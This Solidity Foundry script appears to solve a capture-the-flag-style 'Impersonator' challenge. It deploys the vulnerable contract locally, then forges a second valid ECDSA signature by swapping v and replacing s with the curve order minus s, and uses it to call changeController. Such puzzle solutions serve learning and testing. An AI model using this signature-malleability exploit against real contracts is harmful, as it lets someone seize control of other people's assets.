pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Impersonator,ECLocker} from "../src/Impersonator.sol";

//                                                 +=                                 .#
//                                                 +=                                .#
//                                                 +=                                #
//                                                 +=                              .#
//                                                 +=                             .#
//                                                 +=                            -#
//                                                 +=                           +*
//                                                 +=                          *-
//                                                 +=                         #.
//                                     .......     +=                       -#
//                               =##+:        .=##.+=                      #-
//                            ##.                  *#                    +#
//                          #=                     +=.#+               =#.
//                        **                       +=   +#-          *#.
//                       #.                        +=      .*######+
//                      #.                         +=
//                     #:                          +=
//                    :*                           +=
//                    #                            +=
//                   .*                            +=
//                   ==                            +=
//                   #                             +=
//                   #                             +=
//+##################################################################################################+
//                   #                             +=
//                   #.                            +=
//                   =+                            +=
//                   .#                            +=
//                    #                            +=
//                    .#                           +=
//                     +=                          +=
//                      *-                         +=
//                       *=                        +=     .*##+=-=##=
//                        :#                       +=  .#*           -#:
//                          +#                     +=+#.               .#-
//                            .#*                 :#*                    .#
//                                =##*-:.   .:+##- +=                      **
//                                                 +=                       .#
//                                                 +=                         *-
//                                                 +=                          =*
//                                                 +=                           :#
//                                                 +=                            .#
//                                                 +=                              #.
//                                                 +=                               #
//                                                 +=                                #
//                                                 +=                                 #
//                                                 +=                                 .#

// for local testing
contract deploy is Script
{
    function run() external
    {
        vm.startBroadcast();

        Impersonator impersonator = new Impersonator(1336);
        bytes memory signature = abi.encode(
            [
                uint256(11397568185806560130291530949248708355673262872727946990834312389557386886033),
                uint256(54405834204020870944342294544757609285398723182661749830189277079337680158706),
                uint256(27)
            ]
        );
        impersonator.deployNewLock(signature);

        console.log("impersonator address:", address(impersonator));
        console.log("locker address:", address(impersonator.lockers(0)));

        vm.stopBroadcast();
    }
}


contract unlock is Script
{
    function run() external
    {
        vm.startBroadcast();

        address lockerAddr; //  locker address 

        // from instance creation logs
        uint8  v = 28; // 27 was used when creating the level which corresponds to the upper half
                       // of the elliptic curve (it's symmetric so r (x coordinate) doesn't change)
                       // to use the second valid signature the s value (y coordinate)
                       // will have to come from the lower half of the curve (v = 28)
        bytes32 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
        bytes32 s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;

        ECLocker locker = ECLocker(lockerAddr);

        // google ethereum elliptic curve order (secp256k1n - it's a large prime number)
        uint curveOrder = 115792089237316195423570985008687907852837564279074904382605163141518161494337;
        // subtract the used s from the curve order to get the symmetric y coordinate
        uint _s = curveOrder - uint(s);

        locker.changeController(v, r, bytes32(_s), address (0));
        console.log("new controller:", locker.controller());

        vm.stopBroadcast();
    }
}


